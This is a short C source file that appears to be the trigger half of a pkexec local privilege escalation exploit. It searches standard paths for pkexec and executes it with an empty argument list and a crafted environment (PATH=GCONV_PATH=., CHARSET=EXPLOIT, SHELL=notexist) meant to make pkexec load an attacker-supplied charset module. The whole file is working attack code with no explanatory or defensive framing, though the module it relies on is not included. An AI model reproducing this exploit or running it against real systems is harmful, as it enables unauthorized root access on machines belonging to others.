#include "stdio.h"
#include "unistd.h"

int main()
{
  char *env[] = {
      "test",
      "PATH=GCONV_PATH=.",
      "CHARSET=EXPLOIT",
      "SHELL=notexist",
      NULL};
  char *pkexec_path = NULL;
  char *possible_paths[] = {
      "/usr/bin/pkexec",
      "/usr/local/bin/pkexec",
      "/bin/pkexec",
      NULL};

  for (char **path = possible_paths; *path; path++)
  {
    if (access(*path, F_OK)==0)
    {
      pkexec_path = *path;
      printf("pkexec is located at: %s\n", *path);
      break;
    }
  }

  if (!pkexec_path)
  {
    printf("cannot find pkexec!\n");
    return 0;
  }

  execve(pkexec_path, (char *[]){NULL}, env);

  return 0;
}